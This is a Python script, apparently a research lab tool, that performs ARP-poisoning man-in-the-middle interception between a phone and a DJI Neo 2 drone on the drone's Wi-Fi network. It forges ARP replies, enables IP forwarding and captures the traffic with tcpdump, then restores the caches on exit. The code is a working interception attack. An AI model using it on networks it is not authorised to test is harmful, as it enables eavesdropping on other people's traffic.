#!/usr/bin/env python3
"""Capture the phone<->Neo 2 SWUDP session in clear text from the Pi.

The Neo 2 encrypts its Wi-Fi link with WPA2 and streams video in VHT 80 MHz,
which the lab's RTL8822BU cannot demodulate in monitor mode. As long as no
802.11ac-capable monitor adapter is available, the only way to observe the
real DJI Fly <-> drone traffic in clear is to place the Pi, already an
authenticated station on the drone AP, on the L2 path between the phone and
the drone and let the kernel forward IP.

The tool is deliberately passive toward the drone: it emits only ARP replies
and relies on kernel IP forwarding. It injects no application, DUML or flight
packet. It runs for a fixed duration and, on exit or timeout, restores both
ARP caches and the sysctls it changed, so a lost control channel cannot leave
the drone network poisoned.

This is a lab instrument for the operator's own drone and network. It is not a
flight-control path and contains no motor or flight command.

Known limitation: gratuitous ARP does not win the race for a *fresh* session
open. When the phone re-resolves the gateway on connect, the drone — which is
itself the access point — answers faster, so the SYN and the first ~200 ms of
uplink travel directly and are missed. The downlink is captured from the
start (the drone's cache stays poisoned). A passive VHT80 monitor remains the
way to capture the session open itself.
"""

from __future__ import annotations

import argparse
import signal
import socket
import struct
import subprocess
import time

ETH_P_ALL = 0x0003
ETH_P_ARP = 0x0806


def _mac(text: str) -> bytes:
    return bytes(int(part, 16) for part in text.split(":"))


def _arp_reply(
    src_mac: str,
    dst_mac: str,
    sender_ip: str,
    sender_mac: str,
    target_ip: str,
    target_mac: str,
) -> bytes:
    frame = _mac(dst_mac) + _mac(src_mac) + struct.pack("!H", ETH_P_ARP)
    frame += struct.pack("!HHBBH", 1, 0x0800, 6, 4, 2)
    frame += _mac(sender_mac) + socket.inet_aton(sender_ip)
    frame += _mac(target_mac) + socket.inet_aton(target_ip)
    return frame


def _read(path: str) -> str:
    with open(path) as handle:
        return handle.read().strip()


def _write(path: str, value: str) -> None:
    with open(path, "w") as handle:
        handle.write(value)


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--iface", default="wlan1")
    parser.add_argument("--attacker-mac", required=True, help="this host's iface MAC")
    parser.add_argument("--victim-ip", required=True, help="phone IP")
    parser.add_argument("--victim-mac", required=True, help="phone MAC")
    parser.add_argument("--gateway-ip", required=True, help="drone IP (192.168.2.1)")
    parser.add_argument("--gateway-mac", required=True, help="drone MAC")
    parser.add_argument("--duration", type=float, default=150.0)
    parser.add_argument("--interval", type=float, default=0.1)
    parser.add_argument("--output", required=True, help="pcap path")
    args = parser.parse_args()

    sysctls = {
        "/proc/sys/net/ipv4/ip_forward": "1",
        "/proc/sys/net/ipv4/conf/all/send_redirects": "0",
        f"/proc/sys/net/ipv4/conf/{args.iface}/send_redirects": "0",
    }
    saved: dict[str, str] = {}
    for path, value in sysctls.items():
        try:
            saved[path] = _read(path)
            _write(path, value)
        except OSError:
            pass

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
    sock.bind((args.iface, 0))

    poison_victim = _arp_reply(
        args.attacker_mac, args.victim_mac,
        args.gateway_ip, args.attacker_mac, args.victim_ip, args.victim_mac,
    )
    poison_gateway = _arp_reply(
        args.attacker_mac, args.gateway_mac,
        args.victim_ip, args.attacker_mac, args.gateway_ip, args.gateway_mac,
    )
    restore_victim = _arp_reply(
        args.attacker_mac, args.victim_mac,
        args.gateway_ip, args.gateway_mac, args.victim_ip, args.victim_mac,
    )
    restore_gateway = _arp_reply(
        args.attacker_mac, args.gateway_mac,
        args.victim_ip, args.victim_mac, args.gateway_ip, args.gateway_mac,
    )

    capture = subprocess.Popen(
        ["tcpdump", "-i", args.iface, "-s", "0", "-w", args.output, "-U",
         "host", args.gateway_ip],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )

    stop = {"flag": False}

    def _handle(_signum, _frame):
        stop["flag"] = True

    signal.signal(signal.SIGTERM, _handle)
    signal.signal(signal.SIGINT, _handle)

    deadline = time.monotonic() + args.duration
    try:
        while not stop["flag"] and time.monotonic() < deadline:
            sock.send(poison_victim)
            sock.send(poison_gateway)
            time.sleep(args.interval)
    finally:
        for _ in range(6):
            try:
                sock.send(restore_victim)
                sock.send(restore_gateway)
            except OSError:
                pass
            time.sleep(0.3)
        capture.terminate()
        try:
            capture.wait(timeout=5)
        except subprocess.TimeoutExpired:
            capture.kill()
        for path, value in saved.items():
            try:
                _write(path, value)
            except OSError:
                pass
        sock.close()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
